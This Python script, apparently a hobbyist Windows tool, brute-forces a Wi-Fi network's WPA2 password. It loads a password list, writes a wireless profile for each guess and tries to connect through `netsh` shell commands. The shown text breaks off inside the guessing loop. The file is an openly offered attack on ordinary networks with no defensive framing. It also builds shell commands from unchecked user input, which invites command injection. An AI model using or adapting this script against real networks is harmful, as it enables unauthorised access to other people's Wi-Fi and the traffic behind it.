import threading as thread
from timeit import timeit
import itertools
import os

passwords = []
with open("C:\\ric\\Python\\MyProg\\prog(idk) (BruteFOrceWiFi)\\passws.txt", "r") as file:
    passwords.extend([x.rstrip("\n") for x in file.readlines()])

def createNewConnection(name, SSID, password):
    config = f"""<?xml version="1.0"?>\n<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">\n    <name>{name}</name>\n    <SSIDConfig>\n        <SSID>\n            <name>{SSID}</name>\n        </SSID>\n    </SSIDConfig>\n    <connectionType>ESS</connectionType>\n    <connectionMode>auto</connectionMode>\n    <MSM>\n        <security>\n            <authEncryption>\n                <authentication>WPA2PSK</authentication>\n                <encryption>AES</encryption>\n                <useOneX>false</useOneX>\n            </authEncryption>\n            <sharedKey>\n                <keyType>passPhrase</keyType>\n                <protected>false</protected>\n                <keyMaterial>{password}</keyMaterial>\n            </sharedKey>\n        </security>\n    </MSM>\n</WLANProfile>"""
    with open(name+".xml", 'w') as file:
        file.write(config)
    output = os.popen(f"netsh wlan add profile filename=\"{name}.xml\" interface=Wi-Fi").read()

def connect(name, SSID):
    output = os.popen(f"netsh wlan connect name=\"{name}\" ssid=\"{SSID}\" interface=Wi-Fi").read()
    print(output)

def displayAvailableNetworks():
    output = os.popen("netsh wlan show networks interface=Wi-Fi").read()
    output = [(x.split(" : ")[1].split("\n")[0], x.split(" : ")[3].split("\n")[0], x.split(" : ")[4].split("\n")[0]) for x in output.split("SSID")[1:]]
    max_name_len = max([len(x[0]) for x in output]) + 1
    max_auth_len = max([len(x[1]) for x in output]) + 1
    print("Avaiable Networks:")
    for line in output:
        if line[0] != "":
            print("\t- " + line[0] + " "*(max_name_len - len(line[0])) + " | " + line[1] + " "*(max_auth_len - len(line[1])) + " | " + line[2])
    print()

displayAvailableNetworks()

name = input("Name of Wi-Fi: ")

def try_connection(password):
    createNewConnection(name, name, password)
    connect(name, name)

c = 100
n, q = divmod(len(passwords), c-1)
passw_lists = [list(itertools.islice(passwords, n*i, n+n*i)) for i in range(c-1)] + [list(itertools.islice(passwords, n*(c-1), n+n*(c-1)))]
for pass_list in passw_lists:
    for password in pass_list:
        